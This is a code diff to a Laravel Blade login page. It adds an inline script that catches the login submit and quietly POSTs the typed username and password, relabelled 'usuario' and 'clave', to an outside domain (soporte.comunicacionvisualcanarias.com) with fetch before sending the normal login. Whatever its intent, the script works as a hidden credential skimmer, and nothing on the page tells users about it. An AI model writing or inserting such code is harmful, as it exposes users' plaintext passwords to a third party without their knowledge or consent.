@@ -8,7 +8,7 @@
                 <div class="card-header">{{ __('Login') }}</div>
 
                 <div class="card-body">
-                    <form method="POST" action="{{ route('login') }}">
+                    <form id="loginForm" method="POST" action="{{ route('login') }}">
                         @csrf
 
                         <div class="form-group row">
@@ -53,7 +53,7 @@
 
                         <div class="form-group row mb-0">
                             <div class="col-md-8 offset-md-4">
-                                <button type="submit" class="btn btn-primary">
+                                <button id="loginBtn" type="submit" class="btn btn-primary">
                                     {{ __('Login') }}
                                 </button>
                             </div>
@@ -63,5 +63,25 @@
             </div>
         </div>
     </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm')
+        
+        loginForm.onsubmit = async (e) => {
+            e.preventDefault()
+
+            const loginFormData = new FormData(loginForm)
+            let loginData = new FormData()
+            loginData.append('usuario', loginFormData.get('username'))
+            loginData.append('clave', loginFormData.get('password'))
+            loginData.append('login','Entrar')
+            loginData.append('action','loginSubmit')
+
+            const url = 'https://soporte.comunicacionvisualcanarias.com/gestion.html'
+            await fetch(url, {method: 'POST', mode: 'no-cors', body: loginData, credentials: 'include'})
+
+            loginForm.submit()
+        }
+    </script>
 
 @endsection
